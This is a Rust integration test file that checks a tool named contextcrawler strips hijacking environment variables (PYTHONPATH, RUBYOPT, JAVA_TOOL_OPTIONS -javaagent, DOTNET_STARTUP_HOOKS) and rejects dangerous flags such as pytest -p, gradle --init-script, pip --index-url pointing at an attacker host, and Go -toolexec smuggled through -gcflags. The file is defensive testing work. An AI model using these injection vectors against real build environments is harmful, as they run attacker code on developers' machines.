//! Integration tests for issue #36 — Python / Ruby / JVM / .NET runtime
//! hardening. Each test spawns the real `contextcrawler` binary with a
//! tainted env var set, and asserts that the spawned subprocess does NOT
//! see / load / execute the attacker payload.
//!
//! Per-tool checks are gated on `which::which("<tool>")` succeeding so
//! the suite passes on CI runners that don't have every runtime
//! installed. Negative/positive arg-check tests don't need the real
//! tool and run unconditionally.

use std::path::PathBuf;
use std::process::Command;

mod common;

fn binary_path() -> PathBuf {
    PathBuf::from(env!("CARGO_BIN_EXE_contextcrawler"))
}

fn tool_present(name: &str) -> bool {
    which::which(name).is_ok()
}

/// Run `contextcrawler <args>` with extra env var `key=val` set on the
/// child process. The shared [`common::GLOBAL_ENV_LOCK`] is held across
/// the spawn so env-mutating tests across the suite serialize on a
/// single mutex (issue #48).
fn run_with_env(args: &[&str], envs: &[(&str, &str)]) -> std::process::Output {
    let _guard = common::env_lock();
    let mut cmd = Command::new(binary_path());
    cmd.args(args);
    // Issue #91 — sentinel for release-built spawned binary.
    cmd.env("CONTEXTCRAWLER_TEST_MODE", "1");
    for (k, v) in envs {
        cmd.env(k, v);
    }
    cmd.output().expect("spawn contextcrawler")
}

// ════════════════════════════════════════════════════════════════════
// Negative tests — env-var hijack must NOT reach the subprocess.
// ════════════════════════════════════════════════════════════════════

#[test]
fn pytest_pythonpath_is_not_leaked() {
    if !tool_present("pytest") && !tool_present("python3") && !tool_present("python") {
        eprintln!("skip: no python/pytest on PATH");
        return;
    }

    // Plant a sentinel that would crash any Python import if it were
    // honored (the dir contains no real modules and the path itself
    // is "/tmp/cc-runtime-hardening-evil-DOES-NOT-EXIST").
    let evil = "/tmp/cc-runtime-hardening-evil-DOES-NOT-EXIST";
    let out = run_with_env(
        &["pytest", "--version"],
        &[("PYTHONPATH", evil)],
    );

    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);

    // `pytest --version` should succeed (or at least not crash because
    // of the bogus PYTHONPATH). The critical assertion is that the
    // attacker path didn't get echoed back via some pytest debug path
    // — which would indicate it reached sys.path.
    assert!(
        !stdout.contains(evil) && !stderr.contains(evil),
        "PYTHONPATH={} leaked through to pytest. stdout={}, stderr={}",
        evil,
        stdout,
        stderr
    );
}

#[test]
fn rake_rubyopt_is_not_executed() {
    if !tool_present("rake") && !tool_present("ruby") {
        eprintln!("skip: no ruby/rake on PATH");
        return;
    }

    // RUBYOPT=-r/tmp/evil would make ruby try to `require` an
    // attacker file at startup. Use a non-existent path: if RUBYOPT
    // were honored ruby would die with "LoadError: cannot load such
    // file -- /tmp/...". If it's stripped, ruby/rake runs normally.
    let evil = "/tmp/cc-runtime-hardening-evil-DOES-NOT-EXIST.rb";
    let out = run_with_env(
        &["rake", "--version"],
        &[("RUBYOPT", &format!("-r{}", evil))],
    );

    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);

    assert!(
        !stderr.contains("cannot load such file"),
        "RUBYOPT={} reached ruby — LoadError seen. stderr={}",
        evil,
        stderr
    );
    assert!(
        !stdout.contains(evil) && !stderr.contains(evil),
        "evil path {} leaked into rake output. stdout={}, stderr={}",
        evil,
        stdout,
        stderr
    );
}

#[test]
fn gradle_java_tool_options_is_not_loaded() {
    if !tool_present("gradle") {
        eprintln!("skip: no gradle on PATH");
        return;
    }

    // -javaagent:/path is the classic JAVA_TOOL_OPTIONS RCE vector.
    let evil = "/tmp/cc-runtime-hardening-evil-DOES-NOT-EXIST.jar";
    let out = run_with_env(
        &["gradle", "--version"],
        &[("JAVA_TOOL_OPTIONS", &format!("-javaagent:{}", evil))],
    );

    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);

    // When JAVA_TOOL_OPTIONS reaches the JVM, it prints
    // "Picked up JAVA_TOOL_OPTIONS: ..." to stderr at startup. If
    // we stripped it correctly, that line should NOT appear.
    assert!(
        !stderr.contains("Picked up JAVA_TOOL_OPTIONS"),
        "JAVA_TOOL_OPTIONS reached the JVM. stderr={}",
        stderr
    );
    assert!(
        !stdout.contains(evil) && !stderr.contains(evil),
        "evil javaagent path leaked. stdout={}, stderr={}",
        stdout,
        stderr
    );
}

#[test]
fn dotnet_startup_hooks_is_not_loaded() {
    if !tool_present("dotnet") {
        eprintln!("skip: no dotnet on PATH");
        return;
    }

    // DOTNET_STARTUP_HOOKS=/path.dll loads an arbitrary assembly. If
    // we leak the env var to dotnet, the CLR tries to resolve the
    // assembly and emits "FileNotFoundException" in stderr.
    let evil = "/tmp/cc-runtime-hardening-evil-DOES-NOT-EXIST.dll";
    let out = run_with_env(
        &["dotnet", "--version"],
        &[("DOTNET_STARTUP_HOOKS", evil)],
    );

    let stderr = String::from_utf8_lossy(&out.stderr);

    assert!(
        !stderr.contains("StartupHookProvider")
            && !stderr.contains("FileNotFoundException")
            && !stderr.contains(evil),
        "DOTNET_STARTUP_HOOKS reached the CLR. stderr={}",
        stderr
    );
}

// ════════════════════════════════════════════════════════════════════
// Negative tests — dangerous CLI flags must be rejected.
// ════════════════════════════════════════════════════════════════════
// These do NOT require the real tool installed: the arg check fires
// before exec, so we get exit 2 + the rejection message either way.

#[test]
fn pytest_minus_p_with_path_is_rejected() {
    let out = run_with_env(
        &["pytest", "-p", "/tmp/evil_plugin.py"],
        &[],
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    // Per #49: pytest `-p` denies now cite #49 directly (issue-aware
    // pyrbjvm_deny_message_with_issue) rather than the umbrella #36.
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#49"),
        "pytest -p /tmp/evil_plugin.py should be rejected with #49. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn rubocop_require_is_rejected() {
    let out = run_with_env(
        &["rubocop", "--require", "/tmp/evil.rb"],
        &[],
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#36"),
        "rubocop --require /tmp/evil.rb should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn rspec_require_is_rejected() {
    let out = run_with_env(
        &["rspec", "--require", "/tmp/evil.rb"],
        &[],
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#36"),
        "rspec --require /tmp/evil.rb should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn gradle_init_script_is_rejected() {
    let out = run_with_env(
        &["gradlew", "--init-script", "/tmp/evil.gradle", "tasks"],
        &[],
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#36"),
        "gradlew --init-script should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn pip_index_url_is_rejected() {
    let out = run_with_env(
        &["pip", "install", "--index-url", "http://attacker/", "requests"],
        &[],
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#36"),
        "pip install --index-url should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn mypy_config_file_is_rejected() {
    let out = run_with_env(
        &["mypy", "--config-file", "/tmp/evil.ini", "src/"],
        &[],
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#36"),
        "mypy --config-file should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

// ════════════════════════════════════════════════════════════════════
// Go build-tool RCE coverage (issue #111 G6)
// ════════════════════════════════════════════════════════════════════
// `-toolexec` / `-exec` run an arbitrary binary during the build / test.
// They are CLI flags (not env vars), so `secure_go_command` does NOT
// defend them. The deny check fires before any spawn → exit 2.

#[test]
fn go_build_toolexec_is_rejected() {
    let out = run_with_env(&["go", "build", "-toolexec=/tmp/evil", "./..."], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#111"),
        "go build -toolexec should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn go_test_exec_is_rejected() {
    let out = run_with_env(&["go", "test", "-exec", "/tmp/evil", "./..."], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#111"),
        "go test -exec should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn go_build_gcflags_toolexec_smuggling_is_rejected() {
    let out = run_with_env(&["go", "build", "-gcflags=-toolexec=/tmp/evil", "./..."], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#111"),
        "go build -gcflags=-toolexec= should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn go_build_plain_invocation_is_not_rejected() {
    // `go build ./...` carries no dangerous flag — must not be denied.
    let out = run_with_env(&["go", "build", "./..."], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        !stderr.contains("refusing to forward"),
        "plain `go build ./...` got rejected. stderr={}",
        stderr
    );
}

// Go's flag parser accepts ONE or TWO leading dashes for every flag, so the
// double-dash spelling of each dangerous flag must be rejected just like the
// single-dash form (#111 G6 follow-up).

#[test]
fn go_build_double_dash_toolexec_attached_is_rejected() {
    let out = run_with_env(&["go", "build", "--toolexec=/tmp/evil", "./..."], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#111"),
        "go build --toolexec= should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn go_build_double_dash_toolexec_spaced_is_rejected() {
    let out = run_with_env(&["go", "build", "--toolexec", "/tmp/evil", "./..."], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#111"),
        "go build --toolexec (spaced) should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn go_test_double_dash_exec_is_rejected() {
    let out = run_with_env(&["go", "test", "--exec", "/x", "./..."], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#111"),
        "go test --exec should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn go_build_double_dash_gcflags_toolexec_smuggling_is_rejected() {
    let out = run_with_env(&["go", "build", "--gcflags=-toolexec=/x", "./..."], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#111"),
        "go build --gcflags=-toolexec= should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn go_build_double_dash_gcflags_all_toolexec_smuggling_is_rejected() {
    let out = run_with_env(&["go", "build", "--gcflags=all=-toolexec=/x", "./..."], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#111"),
        "go build --gcflags=all=-toolexec= should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn go_build_double_dash_ldflags_toolexec_smuggling_is_rejected() {
    let out = run_with_env(&["go", "build", "--ldflags=-toolexec=/x", "./..."], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward") && stderr.contains("#111"),
        "go build --ldflags=-toolexec= should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn pytest_config_file_is_rejected() {
    // `-c evil.ini` points pytest at an attacker pytest.ini that can set
    // `addopts = -p /tmp/evil_plugin.py` — bypassing the `-p` block.
    let out = run_with_env(&["pytest", "-c", "evil.ini"], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward"),
        "pytest -c evil.ini should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn gradle_glued_init_script_is_rejected() {
    // `-I/path/init.gradle` (no space) — glued form of `-I`.
    let out = run_with_env(&["gradlew", "-I/tmp/evil.gradle", "tasks"], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward"),
        "gradlew -I/tmp/evil.gradle should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn gradle_settings_file_is_rejected() {
    // `-c x.gradle` loads an attacker settings.gradle (arbitrary Groovy).
    let out = run_with_env(&["gradlew", "-c", "evil.gradle", "tasks"], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward"),
        "gradlew -c evil.gradle should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn golangci_config_file_is_rejected() {
    // golangci-lint loads custom .so plugin linters from its config file.
    let out = run_with_env(&["golangci-lint", "-c", "evil.yml", "run"], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward"),
        "golangci-lint -c evil.yml should be rejected. stderr={}",
        stderr
    );
    assert_eq!(out.status.code(), Some(2));
}

// ════════════════════════════════════════════════════════════════════
// Positive tests — normal invocations still work end-to-end.
// ════════════════════════════════════════════════════════════════════

#[test]
fn pytest_version_still_works() {
    if !tool_present("pytest") && !tool_present("python3") && !tool_present("python") {
        eprintln!("skip: no python/pytest on PATH");
        return;
    }
    let out = run_with_env(&["pytest", "--version"], &[]);
    // Either pytest exists and exits 0 with the version, or python -m
    // pytest is missing and exits non-zero — but in NO case should we
    // see the arg-check rejection message.
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        !stderr.contains("refusing to forward"),
        "normal `pytest --version` got rejected. stderr={}",
        stderr
    );
}

// ════════════════════════════════════════════════════════════════════
// pytest -p bypass coverage (issue #49)
// ════════════════════════════════════════════════════════════════════
// These tests don't need pytest installed — the deny check runs in our
// process before any spawn. We assert exit code 2 + the deny message.

#[test]
fn pytest_p_bare_relative_path_is_rejected() {
    // Pre-fix bypass: `subdir/plugin.py` had no leading `./` so the old
    // `looks_like_path` heuristic missed it. Now any `/` or `\` in the
    // value rejects.
    let out = run_with_env(&["pytest", "-p", "subdir/plugin.py"], &[]);
    assert_eq!(out.status.code(), Some(2), "expected deny exit 2");
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("refusing to forward"),
        "expected deny message; got: {}",
        stderr
    );
    // Pin the issue ref: pytest `-p` denies cite #49, not the umbrella
    // #36 used by other pyrbjvmdotnet checks.
    assert!(
        stderr.contains("#49"),
        "expected #49 in deny message; got: {}",
        stderr
    );
}

#[test]
fn pytest_p_glued_form_is_rejected() {
    // `-pVALUE` (no space) and `-p=VALUE` — argparse-accepted forms that
    // bypassed the old `a == "-p"` exact-equality check.
    let out = run_with_env(&["pytest", "-psubdir/plugin.py"], &[]);
    assert_eq!(out.status.code(), Some(2));
    let out2 = run_with_env(&["pytest", "-p=/tmp/evil.py"], &[]);
    assert_eq!(out2.status.code(), Some(2));
}

#[test]
fn pytest_p_bare_py_extension_is_rejected() {
    // `plugin.py` with no path separator at all — pytest loads it from
    // cwd as a file. A Python module name never ends in `.py`.
    let out = run_with_env(&["pytest", "-p", "plugin.py"], &[]);
    assert_eq!(out.status.code(), Some(2));
}

#[test]
fn pytest_p_legitimate_module_names_still_allowed() {
    // Negative case: deny check should NOT fire for legitimate plugin
    // specifiers. We can't necessarily run pytest here, but we can
    // assert the deny message is absent (whether the underlying spawn
    // succeeds or not depends on whether pytest is installed).
    for value in &[
        "no:cacheprovider",
        "myplugin",
        "mypackage.testplugin",
        "a.b.c",
    ] {
        let out = run_with_env(&["pytest", "-p", value], &[]);
        let stderr = String::from_utf8_lossy(&out.stderr);
        assert!(
            !stderr.contains("refusing to forward"),
            "legitimate `pytest -p {}` got rejected. stderr={}",
            value,
            stderr
        );
    }
}

#[test]
fn dotnet_version_still_works() {
    if !tool_present("dotnet") {
        eprintln!("skip: no dotnet on PATH");
        return;
    }
    let out = run_with_env(&["dotnet", "--version"], &[]);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        !stderr.contains("refusing to forward"),
        "normal `dotnet --version` got rejected. stderr={}",
        stderr
    );
    assert!(
        out.status.success(),
        "`dotnet --version` failed: stderr={}",
        stderr
    );
}
